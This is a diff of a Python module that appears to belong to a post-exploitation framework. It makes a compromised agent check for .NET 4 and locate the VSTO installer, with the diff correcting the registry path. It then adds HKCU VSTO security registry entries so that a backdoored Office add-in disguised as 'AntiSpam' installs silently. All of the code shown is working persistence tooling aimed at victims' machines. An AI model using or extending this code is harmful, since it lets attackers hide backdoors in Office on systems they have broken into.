@@ -32,11 +32,12 @@ def run(API, agent_name, vsto_zip_backdoor_url):
                     Where { $_.PSChildName -match '^(?!S)\\p{L}'} |
                     Select PSChildName, Version"""
     opts['command'] = findDotNet
-    if(" 4." not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
+    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
+    if(" 4." not in results):
         raise ValueError('No .NET 4 Client Profile, cannot proceed')
     
     # Get VSTO installer path
-    opts['command'] = """Get-ChildItem -recurse 'HKLM:\\Software\\Microsoft\\VSTO Runtime Setup' | 
+    opts['command'] = """Get-ChildItem -recurse 'HKLM:\\Software\\WOW6432Node\\Microsoft\\VSTO Runtime Setup' | 
                          Get-ItemProperty | Select InstallerPath | ft -hidetableheaders"""
     VSTOinstallerpath = API.agent_run_shell_cmd_with_result(agent_name, opts)
     if(".exe" not in VSTOinstallerpath):
@@ -47,7 +48,7 @@ def run(API, agent_name, vsto_zip_backdoor_url):
     uploadpath = API.agent_run_shell_cmd_with_result(agent_name, opts)
     
     # add registry settings for silent VSTO install
-    vsto_reg_add = r"""New-Item 'HKCU:\Software\Microsoft\VSTO\Security\Inclusion\97618ff9-cf79-4ce2-b530-43e570019f67' -Force |
+    vsto_reg_add = r"""New-Item 'HKCU:\Software\Microsoft\VSTO\Security\Inclusion\ee35586c-2dca-4494-99ec-8a03267c9129' -Force |
                        New-ItemProperty -Name PublicKey -Value '<RSAKeyValue><Modulus>1uL5d9QfFi4PfJpvvtUHXu6sROwLlO/kMQtYC3z3JpEneqAlyu7Dd+c4akI7xre5X2jMBI5D+hVWxrEiqPBnN8meKW2U59DTLPS6ZTBPYfdGxR65gY8AD8uGjlNfafm3niHL1yivC7zs1rz2W2z+aR7fmB0pNMe45k3uC2UWQo0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>' |
                        New-ItemProperty -Name Url -Value 'file:///REPLACEME/Apps/antispam/AntiSpam.vsto'"""
     vsto_reg_add = vsto_reg_add.replace('REPLACEME',uploadpath.replace('\\','/'))
